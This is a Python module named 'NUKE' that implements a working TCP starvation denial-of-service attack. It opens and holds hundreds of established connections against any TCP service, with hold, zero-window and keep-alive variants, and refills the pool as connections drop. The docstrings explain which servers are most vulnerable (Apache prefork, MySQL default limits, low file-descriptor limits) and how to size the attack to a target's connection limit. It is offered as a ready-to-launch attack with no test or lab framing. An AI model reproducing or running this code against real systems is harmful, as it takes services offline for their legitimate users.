"""
modules/nuke.py - NUKE
TCP Starvation Attack. Exhausts TCP connection resources via persistence.

How it works:
  Unlike SYN flood (half-open), NUKE completes the TCP handshake to create
  ESTABLISHED connections, then keeps them open doing nothing.

  Server resource cost per established connection:
    - TCP Control Block (TCB): ~500-1500 bytes kernel memory
    - File descriptor slot
    - Thread or epoll slot (depending on server model)
    - Keep-alive timer

  By filling the server's connection table with idle ESTABLISHED connections,
  legitimate clients get ECONNREFUSED or timeout.

  Effective against:
    - Servers with low ulimit -n (default 1024 FD on some systems)
    - Apache prefork/worker (each connection holds a thread/process)
    - Any server with MaxConnections limit
    - Databases (MySQL max_connections=151 default)
    - Custom TCP services with connection limits

  Variants:
    "hold"    : Complete handshake, send nothing, hold connection
    "window0" : Complete handshake, set TCP window=0 (zero-window stall)
                Server cannot send data, must keep connection for retransmit
    "persist" : Send 1 byte every N seconds to prevent idle timeout

  Difference vs Slowloris:
    Slowloris = HTTP layer (needs HTTP server)
    NUKE      = pure TCP layer (works on ANY TCP service: DB, SMTP, custom)

  Checking server limits:
    cat /proc/sys/net/core/somaxconn      (max backlog)
    ss -s                                 (connection states summary)
    ss -t state established | wc -l       (established count)
    ulimit -n                             (file descriptor limit)
"""

import socket
import ssl
import time
import random
import threading
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class NukeMetrics:
    sockets_open:    int = 0
    sockets_failed:  int = 0
    sockets_expired: int = 0
    start_time:      float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def open(self) -> None:
        with self._lock: self.sockets_open += 1

    def fail(self) -> None:
        with self._lock: self.sockets_failed += 1

    def expire(self) -> None:
        with self._lock:
            self.sockets_open = max(0, self.sockets_open - 1)
            self.sockets_expired += 1

    def summary(self) -> dict:
        return {
            "sockets_open":    self.sockets_open,
            "sockets_failed":  self.sockets_failed,
            "sockets_expired": self.sockets_expired,
            "elapsed_s":       round(time.time() - self.start_time, 2),
        }


def _connect(host: str, port: int, use_ssl: bool,
             timeout: float) -> Optional[socket.socket]:
    """Complete TCP 3-way handshake -> ESTABLISHED connection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        return s
    except (socket.error, ssl.SSLError, OSError):
        return None


def _set_window_zero(s: socket.socket) -> bool:
    """
    Set TCP receive window to 0 via SO_RCVBUF=0.
    Server sees RWND=0 -> enters zero-window probe loop.
    Cannot close connection until timeout.
    """
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
        return True
    except OSError:
        return False


class NukeEngine:
    """
    Maintains `socket_count` ESTABLISHED TCP connections.
    Variant determines how connections are kept alive.
    """

    def __init__(
        self,
        host: str,
        port: int = 80,
        socket_count: int = 500,
        variant: str = "hold",
        persist_interval: float = 30.0,
        duration: int = 60,
        use_ssl: bool = False,
        timeout: float = 10.0,
    ) -> None:
        self.host             = host
        self.port             = port
        self.socket_count     = socket_count
        self.variant          = variant
        self.persist_interval = persist_interval
        self.duration         = duration
        self.use_ssl          = use_ssl
        self.timeout          = timeout

        self.metrics  = NukeMetrics()
        self._sockets: list[socket.socket] = []
        self._stop    = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def _fill_pool(self) -> None:
        while len(self._sockets) < self.socket_count and not self._stop.is_set():
            s = _connect(self.host, self.port, self.use_ssl, self.timeout)
            if s:
                if self.variant == "window0":
                    _set_window_zero(s)
                self._sockets.append(s)
                self.metrics.open()
            else:
                self.metrics.fail()
            # Stagger connections slightly
            time.sleep(random.uniform(0.002, 0.01))

    def _main_loop(self) -> None:
        deadline = time.time() + self.duration if self.duration > 0 else float("inf")
        self._fill_pool()

        while not self._stop.is_set() and time.time() < deadline:
            dead = []

            if self.variant == "persist":
                # Send 1 byte to keep connection alive
                for s in self._sockets:
                    try:
                        s.send(b"\x00")
                    except (socket.error, OSError):
                        dead.append(s)
            else:
                # "hold" or "window0": just check if still alive
                for s in self._sockets:
                    try:
                        s.getpeername()
                    except OSError:
                        dead.append(s)

            for s in dead:
                try: s.close()
                except Exception: pass
                self._sockets.remove(s)
                self.metrics.expire()

            self._fill_pool()

            wait = self.persist_interval if self.variant == "persist" else 5.0
            self._stop.wait(wait + random.uniform(-1, 1))

        for s in self._sockets:
            try: s.close()
            except Exception: pass
        self._sockets.clear()
        self._stop.set()

    def start(self) -> None:
        self._stop.clear()
        self._thread = threading.Thread(target=self._main_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()

    def wait(self) -> None:
        if self._thread:
            self._thread.join(timeout=self.duration + 10)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


def run(
    host: str,
    port: int = 80,
    socket_count: int = 500,
    variant: str = "hold",
    persist_interval: float = 30.0,
    duration: int = 60,
    use_ssl: bool = False,
) -> NukeEngine:
    """
    Launch TCP starvation (NUKE) attack.

    Args:
        host             : Target hostname or IP.
        port             : Target TCP port. Works on ANY TCP service.
        socket_count     : Concurrent ESTABLISHED connections to maintain.
                           Set to server's MaxConnections or ulimit -n.
        variant          : "hold"    - connect and do nothing (pure starvation)
                           "window0" - zero-window stall (server can't send)
                           "persist" - send 1 byte every N sec (bypass idle timeout)
        persist_interval : Seconds between keep-alive bytes (persist variant).
        duration         : Duration in seconds.
        use_ssl          : TLS wrap (for HTTPS/SMTPS/etc).

    Returns:
        NukeEngine (already started).

    Target identification:
        # Check server connection limit
        ss -t state established 'dst <target_ip>' | wc -l
        # Watch for ECONNREFUSED = connection table full
    """
    engine = NukeEngine(
        host=host,
        port=port,
        socket_count=socket_count,
        variant=variant,
        persist_interval=persist_interval,
        duration=duration,
        use_ssl=use_ssl,
    )
    engine.start()
    return engine
